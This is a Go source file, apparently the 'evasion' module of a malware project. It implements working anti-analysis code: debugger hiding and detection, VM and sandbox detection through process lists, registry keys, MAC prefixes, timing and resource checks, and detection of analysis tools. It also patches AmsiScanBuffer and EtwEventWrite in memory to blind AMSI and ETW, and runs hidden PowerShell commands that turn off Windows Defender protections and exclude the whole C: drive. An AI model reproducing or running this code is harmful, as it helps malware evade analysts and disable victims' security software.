package evasion

/*
	Anti-analysis and evasion techniques

	Most of this is based on stuff from:
	- https://anti-debug.checkpoint.com/
	- al-khaser project
	- various forum posts

	Some of these are old school but still work lol

	TODO: add RDTSC timing checks
	TODO: add hardware breakpoint detection
*/

import (
	"os"
	"os/exec"
	"phantom/syscalls"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var (
	ntdll    = syscall.NewLazyDLL("ntdll.dll")
	kernel32 = syscall.NewLazyDLL("kernel32.dll")

	procNtQueryInformationProcess = ntdll.NewProc("NtQueryInformationProcess")
	procNtSetInformationThread    = ntdll.NewProc("NtSetInformationThread")
	procGetModuleHandle           = kernel32.NewProc("GetModuleHandleW")
	procGetProcAddress            = kernel32.NewProc("GetProcAddress")
	procVirtualProtect            = kernel32.NewProc("VirtualProtect")
	procGetCurrentThread          = kernel32.NewProc("GetCurrentThread")
)

// NtQueryInformationProcess info classes
const (
	ProcessDebugPort         = 7
	ProcessDebugObjectHandle = 30
	ProcessDebugFlags        = 31
	ThreadHideFromDebugger   = 17 // for NtSetInformationThread
	PAGE_EXECUTE_READWRITE   = 0x40
)

// RunAntiAnalysis - main entry point for all checks
// Returns true if we're safe to proceed, false if we should bail
func RunAntiAnalysis(antiVM, antiDebug bool) bool {
	if antiDebug {
		// first, try to hide ourselves from any attached debugger
		hideFromDebugger()

		// then check if we're being debugged anyway
		if isDebugged() {
			return false // nope, get outta here
		}
	}

	if antiVM {
		// check for VM indicators
		if isVirtualized() {
			return false
		}

		// sandboxes often mess with timing
		if isSandboxTiming() {
			return false
		}

		// real machines have real resources
		if isResourceConstrained() {
			return false
		}
	}

	return true // all good, let's go
}

// hideFromDebugger - uses NtSetInformationThread trick
// this doesn't detach debuggers, just hides future events from them
func hideFromDebugger() {
	handle, _, _ := procGetCurrentThread.Call()
	// ThreadHideFromDebugger = 0x11 (17)
	procNtSetInformationThread.Call(
		handle,
		ThreadHideFromDebugger,
		0,
		0,
	)
}

// isDebugged - checks multiple debugger detection methods
// using multiple methods because some debuggers bypass specific checks
func isDebugged() bool {
	// Method 1: good old IsDebuggerPresent
	// easy to bypass but catches script kiddies
	if syscalls.IsDebuggerPresent() {
		return true
	}

	// Method 2: CheckRemoteDebuggerPresent
	// catches some remote debugging scenarios
	if syscalls.CheckRemoteDebugger() {
		return true
	}

	// Method 3: NtQueryInformationProcess - DebugPort
	// this one's harder to fake
	var debugPort uintptr
	handle, _ := syscall.GetCurrentProcess()
	ret, _, _ := procNtQueryInformationProcess.Call(
		uintptr(handle),
		ProcessDebugPort,
		uintptr(unsafe.Pointer(&debugPort)),
		unsafe.Sizeof(debugPort),
		0,
	)
	if ret == 0 && debugPort != 0 {
		return true // nonzero port = debugger attached
	}

	// Method 4: NtQueryInformationProcess - DebugFlags
	// if flags are 0, we're being debugged
	var debugFlags uint32
	ret, _, _ = procNtQueryInformationProcess.Call(
		uintptr(handle),
		ProcessDebugFlags,
		uintptr(unsafe.Pointer(&debugFlags)),
		unsafe.Sizeof(debugFlags),
		0,
	)
	if ret == 0 && debugFlags == 0 {
		return true // flags=0 means NoDebugInherit is set
	}

	// Method 5: timing check
	// debuggers make things slow af
	start := time.Now()
	for i := 0; i < 100; i++ {
		_ = i * i // busywork
	}
	elapsed := time.Since(start)
	if elapsed > time.Millisecond*100 {
		return true // way too slow, probably single-stepping
	}

	return false
}

// isVirtualized - checks for VM/sandbox indicators
// combines process, registry, and hardware checks
func isVirtualized() bool {
	// Check running processes for VM tools
	processes, _ := syscalls.EnumProcesses()

	// VM-specific processes
	// these are guest additions/tools that run in VMs
	vmProcesses := []string{
		// vmware
		"vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
		// virtualbox
		"vboxservice.exe", "vboxtray.exe",
		// qemu/kvm
		"qemu-ga.exe", "vdagent.exe", "vdservice.exe",
		// xen
		"xenservice.exe",
		// joe sandbox
		"joeboxcontrol.exe", "joeboxserver.exe",
		// parallels
		"prl_tools.exe", "prl_cc.exe",
		// sandboxie (not really a VM but we check anyway)
		"sandboxierpcss.exe", "sandboxiedcomlaunch.exe",
	}

	for _, proc := range processes {
		procLower := strings.ToLower(proc)
		for _, vmProc := range vmProcesses {
			if procLower == vmProc {
				return true
			}
		}
	}

	// Also check for analysis tools while we're at it
	// if these are running, someone's probably looking at us
	analysisProcs := []string{
		// network
		"wireshark.exe", "fiddler.exe", "charles.exe",
		// process analysis
		"procmon.exe", "procexp.exe", "processhacker.exe",
		// debuggers
		"x64dbg.exe", "x32dbg.exe", "ollydbg.exe",
		// disassemblers
		"idaq.exe", "idaq64.exe", "ida.exe", "ida64.exe",
		// other
		"pestudio.exe", "pe-bear.exe",
		"httpdebuggerpro.exe", "httpdebugger.exe",
		"ghidra.exe", "binaryninja.exe",
	}

	for _, proc := range processes {
		procLower := strings.ToLower(proc)
		for _, analysisProc := range analysisProcs {
			if procLower == analysisProc {
				return true
			}
		}
	}

	// Registry checks for VM artifacts
	// VMs often leave these keys around
	vmRegistryKeys := []string{
		`HKEY_LOCAL_MACHINE\SOFTWARE\VMware, Inc.\VMware Tools`,
		`HKEY_LOCAL_MACHINE\SOFTWARE\Oracle\VirtualBox Guest Additions`,
		`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters`,
	}

	for _, key := range vmRegistryKeys {
		cmd := exec.Command("reg", "query", key)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		if err := cmd.Run(); err == nil {
			return true // key exists = VM
		}
	}

	// MAC address prefix check
	// VMs have vendor-specific OUIs (first 3 bytes of MAC)
	vmMACPrefixes := []string{
		"00:0C:29", "00:50:56", "00:05:69", // VMware
		"08:00:27", "0A:00:27", // VirtualBox
		"00:1C:42", // Parallels
		"00:16:3E", // Xen
		"00:15:5D", // Hyper-V
	}

	cmd := exec.Command("getmac", "/fo", "csv", "/nh")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	output, err := cmd.Output()
	if err == nil {
		outputStr := strings.ToUpper(string(output))
		for _, prefix := range vmMACPrefixes {
			// windows shows MACs with dashes not colons
			if strings.Contains(outputStr, strings.ReplaceAll(prefix, ":", "-")) {
				return true
			}
		}
	}

	return false
}

// isSandboxTiming - detects sandbox via timing anomalies
// many sandboxes accelerate time or skip sleep calls
func isSandboxTiming() bool {
	// Sleep for 500ms and check if it actually took that long
	start := syscalls.GetTickCount64()
	time.Sleep(500 * time.Millisecond)
	elapsed := syscalls.GetTickCount64() - start

	// Should be around 500ms
	// If it's much less, sandbox is probably skipping our sleep
	if elapsed < 450 {
		return true
	}

	return false
}

// isResourceConstrained - checks for minimal resources
// real machines usually have decent specs, sandboxes are bare minimum
func isResourceConstrained() bool {
	// RAM check - sandboxes usually have 1-2GB
	mem, err := syscalls.GetMemoryStatus()
	if err == nil {
		totalGB := mem.TotalPhys / (1024 * 1024 * 1024)
		if totalGB < 4 {
			return true // who uses a PC with <4GB RAM in 2024?
		}
	}

	// CPU check - sandboxes often have 1-2 cores
	if runtime.NumCPU() < 2 {
		return true
	}

	// disk size check
	if isDiskSmall() {
		return true
	}

	// check for user activity
	// sandboxes are freshly created with no user files
	if !hasRecentFiles() {
		return true
	}

	return false
}

// isDiskSmall - most sandboxes have tiny disks (20-40GB)
func isDiskSmall() bool {
	var freeBytesAvailable, totalBytes, totalFreeBytes uint64

	pathPtr, _ := syscall.UTF16PtrFromString("C:\\")
	kernel32.NewProc("GetDiskFreeSpaceExW").Call(
		uintptr(unsafe.Pointer(pathPtr)),
		uintptr(unsafe.Pointer(&freeBytesAvailable)),
		uintptr(unsafe.Pointer(&totalBytes)),
		uintptr(unsafe.Pointer(&totalFreeBytes)),
	)

	totalGB := totalBytes / (1024 * 1024 * 1024)
	return totalGB < 60 // less than 60GB is sus
}

// hasRecentFiles - real users have recent files
// sandboxes are clean installs with nothing in Recent
func hasRecentFiles() bool {
	recentPath := os.Getenv("APPDATA") + `\Microsoft\Windows\Recent`
	entries, err := os.ReadDir(recentPath)
	if err != nil {
		return true // can't check, assume real to avoid false positives
	}

	// real users have lots of recent files
	return len(entries) > 10
}

// PatchAMSI - disables AMSI (Anti-Malware Scan Interface)
// This patches AmsiScanBuffer to always return clean result
// Works on Win10+ where AMSI is present
func PatchAMSI() error {
	// try to load amsi.dll
	amsi := syscall.NewLazyDLL("amsi.dll")
	amsiScanBuffer := amsi.NewProc("AmsiScanBuffer")

	addr := amsiScanBuffer.Addr()
	if addr == 0 {
		return nil // amsi not loaded, we're good
	}

	// Patch bytes: xor eax, eax; ret
	// This makes the function return 0 (AMSI_RESULT_CLEAN)
	patch := []byte{0x31, 0xC0, 0xC3}

	// need to make memory writable first
	var oldProtect uint32
	ret, _, _ := procVirtualProtect.Call(
		addr,
		uintptr(len(patch)),
		PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return nil // VirtualProtect failed, oh well
	}

	// write our patch
	// this is cursed pointer math but it works lol
	for i, b := range patch {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
	}

	// restore original protection
	procVirtualProtect.Call(
		addr,
		uintptr(len(patch)),
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	return nil
}

// PatchETW - disables Event Tracing for Windows
// ETW is used by EDRs to monitor process behavior
func PatchETW() error {
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	etwEventWrite := ntdll.NewProc("EtwEventWrite")

	addr := etwEventWrite.Addr()
	if addr == 0 {
		return nil
	}

	// just make it return immediately
	patch := []byte{0xC3} // ret

	var oldProtect uint32
	ret, _, _ := procVirtualProtect.Call(
		addr,
		uintptr(len(patch)),
		PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return nil
	}

	// single byte patch
	*(*byte)(unsafe.Pointer(addr)) = patch[0]

	// restore protection
	procVirtualProtect.Call(
		addr,
		uintptr(len(patch)),
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	return nil
}

// DisableWindowsDefender - tries to disable Defender
// Requires admin, so this usually fails, but worth trying
// Only works on older Win10 builds anyway
func DisableWindowsDefender() {
	// these need admin rights
	cmds := []string{
		`Set-MpPreference -DisableRealtimeMonitoring $true`,
		`Set-MpPreference -DisableBehaviorMonitoring $true`,
		`Set-MpPreference -DisableBlockAtFirstSeen $true`,
		`Set-MpPreference -DisableIOAVProtection $true`,
		`Set-MpPreference -DisableScriptScanning $true`,
		`Add-MpPreference -ExclusionPath "C:\"`, // yolo
	}

	for _, cmd := range cmds {
		exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", cmd).Run()
	}
}

// AddDefenderExclusion - adds exclusion for our exe path
// This one often works even without full admin
func AddDefenderExclusion() {
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	// try to add exclusion silently
	cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command",
		`Add-MpPreference -ExclusionPath "`+exePath+`"`)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run() // ignore errors, best effort
}
